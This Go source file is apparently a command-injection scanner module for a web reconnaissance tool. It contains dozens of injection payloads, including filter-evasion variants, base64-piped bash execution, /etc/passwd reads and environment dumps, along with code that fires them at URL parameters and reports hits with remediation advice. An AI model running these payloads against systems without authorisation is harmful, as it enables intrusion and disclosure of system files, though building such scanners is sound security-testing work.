package cmdi

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/a0x194/recon-hunter/internal/config"
	"github.com/a0x194/recon-hunter/internal/types"
	"github.com/a0x194/recon-hunter/internal/utils"
)

// Command injection payloads
var cmdiPayloads = []struct {
	payload     string
	indicator   string
	os          string
	description string
	timeBased   bool
	delay       int // seconds
}{
	// Basic command separators
	{";id", "uid=", "linux", "Semicolon separator", false, 0},
	{"|id", "uid=", "linux", "Pipe separator", false, 0},
	{"||id", "uid=", "linux", "OR separator", false, 0},
	{"&&id", "uid=", "linux", "AND separator", false, 0},
	{"`id`", "uid=", "linux", "Backtick injection", false, 0},
	{"$(id)", "uid=", "linux", "Subshell injection", false, 0},
	{"\nid\n", "uid=", "linux", "Newline injection", false, 0},
	{"\rid\r", "uid=", "linux", "Carriage return injection", false, 0},

	// Windows commands
	{";whoami", "\\", "windows", "Semicolon separator (Windows)", false, 0},
	{"|whoami", "\\", "windows", "Pipe separator (Windows)", false, 0},
	{"||whoami", "\\", "windows", "OR separator (Windows)", false, 0},
	{"&&whoami", "\\", "windows", "AND separator (Windows)", false, 0},
	{"\nwhoami\n", "\\", "windows", "Newline injection (Windows)", false, 0},

	// Encoded payloads
	{"%0aid", "uid=", "linux", "URL encoded newline", false, 0},
	{"%0a%0did", "uid=", "linux", "URL encoded CRLF", false, 0},
	{"%3Bid", "uid=", "linux", "URL encoded semicolon", false, 0},
	{"%7Cid", "uid=", "linux", "URL encoded pipe", false, 0},
	{"%26%26id", "uid=", "linux", "URL encoded AND", false, 0},
	{"%60id%60", "uid=", "linux", "URL encoded backticks", false, 0},
	{"$(id)", "uid=", "linux", "Dollar subshell", false, 0},

	// Space bypass
	{";id", "uid=", "linux", "No space", false, 0},
	{";${IFS}id", "uid=", "linux", "IFS space bypass", false, 0},
	{";{id,}", "uid=", "linux", "Brace expansion", false, 0},
	{";id$u", "uid=", "linux", "Undefined variable", false, 0},
	{";cat${IFS}/etc/passwd", "root:", "linux", "IFS with path", false, 0},

	// Quote escaping
	{"';id;'", "uid=", "linux", "Single quote escape", false, 0},
	{"\";id;\"", "uid=", "linux", "Double quote escape", false, 0},
	{"';id;#", "uid=", "linux", "Comment after payload", false, 0},
	{"\";id;#", "uid=", "linux", "Double quote with comment", false, 0},

	// Time-based blind
	{";sleep 5;", "", "linux", "Time-based (sleep 5)", true, 5},
	{"|sleep 5|", "", "linux", "Time-based pipe (sleep 5)", true, 5},
	{"$(sleep 5)", "", "linux", "Time-based subshell", true, 5},
	{"`sleep 5`", "", "linux", "Time-based backtick", true, 5},
	{"||sleep 5||", "", "linux", "Time-based OR", true, 5},
	{"&&sleep 5&&", "", "linux", "Time-based AND", true, 5},

	// Windows time-based
	{";ping -n 5 127.0.0.1;", "", "windows", "Time-based ping (Windows)", true, 5},
	{"|ping -n 5 127.0.0.1|", "", "windows", "Time-based pipe ping", true, 5},
	{"&ping -n 5 127.0.0.1&", "", "windows", "Time-based background ping", true, 5},
	{"||ping -n 5 127.0.0.1||", "", "windows", "Time-based OR ping", true, 5},

	// Advanced bypasses
	{";{cat,/etc/passwd}", "root:", "linux", "Brace expansion cat", false, 0},
	{";cat$IFS/etc/passwd", "root:", "linux", "IFS cat passwd", false, 0},
	{";ca$@t /etc/passwd", "root:", "linux", "Dollar at bypass", false, 0},
	{";c'a't /etc/passwd", "root:", "linux", "Quote split bypass", false, 0},
	{";c\"a\"t /etc/passwd", "root:", "linux", "Double quote split", false, 0},
	{";/???/??t /etc/passwd", "root:", "linux", "Wildcard path", false, 0},
	{";/???/c?t /etc/passwd", "root:", "linux", "Partial wildcard", false, 0},

	// Hex/Octal encoded
	{";$'\\x69\\x64'", "uid=", "linux", "Hex encoded id", false, 0},
	{";$'\\151\\144'", "uid=", "linux", "Octal encoded id", false, 0},

	// Base64 encoded execution
	{";echo aWQ= | base64 -d | bash", "uid=", "linux", "Base64 encoded command", false, 0},
	{";`echo aWQ= | base64 -d`", "uid=", "linux", "Backtick base64", false, 0},
	{";$(echo aWQ= | base64 -d)", "uid=", "linux", "Subshell base64", false, 0},

	// Environment variable exfiltration
	{";echo $PATH", "/usr", "linux", "PATH variable", false, 0},
	{";printenv", "PATH=", "linux", "Print environment", false, 0},
	{";env", "PATH=", "linux", "Env command", false, 0},
}

// Command injection prone parameters
var cmdiParams = []string{
	"cmd", "exec", "command", "execute", "ping", "query", "jump", "code",
	"reg", "do", "func", "arg", "option", "load", "process", "step",
	"read", "function", "req", "feature", "exe", "module", "payload",
	"run", "print", "daemon", "dir", "host", "ip", "domain", "url",
	"log", "download", "upload", "email", "to", "from", "action",
	"filename", "file", "folder", "path", "include", "page", "doc",
}

// Scan performs command injection scanning
func Scan(urls []string, cfg *config.Config) ([]types.VulnResult, error) {
	var results []types.VulnResult
	var mu sync.Mutex
	var wg sync.WaitGroup

	client := utils.HTTPClient(cfg.Timeout, cfg.Proxy, true)
	sem := make(chan struct{}, cfg.Threads)

	for _, urlStr := range urls {
		if !utils.HasParam(urlStr) {
			continue
		}

		parsedURL, err := url.Parse(urlStr)
		if err != nil {
			continue
		}

		params := parsedURL.Query()
		hasCmdiParam := false
		for param := range params {
			paramLower := strings.ToLower(param)
			for _, cmdiParam := range cmdiParams {
				if strings.Contains(paramLower, cmdiParam) {
					hasCmdiParam = true
					break
				}
			}
		}

		if !hasCmdiParam {
			continue
		}

		wg.Add(1)
		sem <- struct{}{}

		go func(u string) {
			defer wg.Done()
			defer func() { <-sem }()

			vulns := testCmdi(u, client, cfg.Timeout)
			if len(vulns) > 0 {
				mu.Lock()
				results = append(results, vulns...)
				mu.Unlock()
			}
		}(urlStr)
	}

	wg.Wait()
	return results, nil
}

func testCmdi(urlStr string, client *http.Client, timeout int) []types.VulnResult {
	var results []types.VulnResult

	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return nil
	}

	params := parsedURL.Query()

	for param := range params {
		for _, test := range cmdiPayloads {
			var result *types.VulnResult
			if test.timeBased {
				result = testTimeBasedPayload(urlStr, param, test.payload, test.os, test.description, test.delay, client, timeout)
			} else {
				result = testPayload(urlStr, param, test.payload, test.indicator, test.os, test.description, client)
			}

			if result != nil {
				results = append(results, *result)
				break // Found command injection for this param
			}
		}
	}

	return results
}

func testPayload(urlStr, param, payload, indicator, os, description string, client *http.Client) *types.VulnResult {
	parsedURL, _ := url.Parse(urlStr)
	originalParams := parsedURL.Query()
	originalValue := originalParams.Get(param)

	testParams := url.Values{}
	for k, v := range originalParams {
		testParams[k] = v
	}
	testParams.Set(param, originalValue+payload)

	parsedURL.RawQuery = testParams.Encode()
	testURL := parsedURL.String()

	resp, err := client.Get(testURL)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil
	}

	bodyStr := string(body)

	if strings.Contains(bodyStr, indicator) {
		return &types.VulnResult{
			Type:        "Command Injection",
			Severity:    "critical",
			URL:         urlStr,
			Parameter:   param,
			Payload:     payload,
			Evidence:    fmt.Sprintf("Indicator '%s' found in response. Target OS: %s", indicator, os),
			Description: fmt.Sprintf("Command injection vulnerability detected. Technique: %s", description),
			Remediation: "Never pass user input to system commands. Use parameterized APIs. Implement strict input validation with allowlists.",
			References: []string{
				"https://owasp.org/www-community/attacks/Command_Injection",
				"https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
			},
		}
	}

	return nil
}

func testTimeBasedPayload(urlStr, param, payload, os, description string, expectedDelay int, client *http.Client, timeout int) *types.VulnResult {
	parsedURL, _ := url.Parse(urlStr)
	originalParams := parsedURL.Query()
	originalValue := originalParams.Get(param)

	testParams := url.Values{}
	for k, v := range originalParams {
		testParams[k] = v
	}
	testParams.Set(param, originalValue+payload)

	parsedURL.RawQuery = testParams.Encode()
	testURL := parsedURL.String()

	// Create a client with longer timeout for time-based tests
	timeBasedClient := &http.Client{
		Timeout: time.Duration(timeout+expectedDelay+5) * time.Second,
	}

	start := time.Now()
	resp, err := timeBasedClient.Get(testURL)
	elapsed := time.Since(start)

	if err != nil {
		// Timeout might indicate successful sleep
		if strings.Contains(err.Error(), "timeout") && elapsed >= time.Duration(expectedDelay)*time.Second {
			return &types.VulnResult{
				Type:        "Command Injection (Time-based Blind)",
				Severity:    "critical",
				URL:         urlStr,
				Parameter:   param,
				Payload:     payload,
				Evidence:    fmt.Sprintf("Request timed out after %v (expected delay: %ds). Target OS: %s", elapsed, expectedDelay, os),
				Description: fmt.Sprintf("Time-based blind command injection detected. Technique: %s", description),
				Remediation: "Never pass user input to system commands. Use parameterized APIs. Implement strict input validation.",
				References: []string{
					"https://owasp.org/www-community/attacks/Command_Injection",
				},
			}
		}
		return nil
	}
	defer resp.Body.Close()

	// Check if response was delayed
	if elapsed >= time.Duration(expectedDelay)*time.Second && elapsed < time.Duration(expectedDelay+3)*time.Second {
		return &types.VulnResult{
			Type:        "Command Injection (Time-based Blind)",
			Severity:    "critical",
			URL:         urlStr,
			Parameter:   param,
			Payload:     payload,
			Evidence:    fmt.Sprintf("Response delayed by %v (expected: %ds). Target OS: %s", elapsed, expectedDelay, os),
			Description: fmt.Sprintf("Time-based blind command injection detected. Technique: %s", description),
			Remediation: "Never pass user input to system commands. Use parameterized APIs. Implement strict input validation.",
			References: []string{
				"https://owasp.org/www-community/attacks/Command_Injection",
			},
		}
	}

	return nil
}
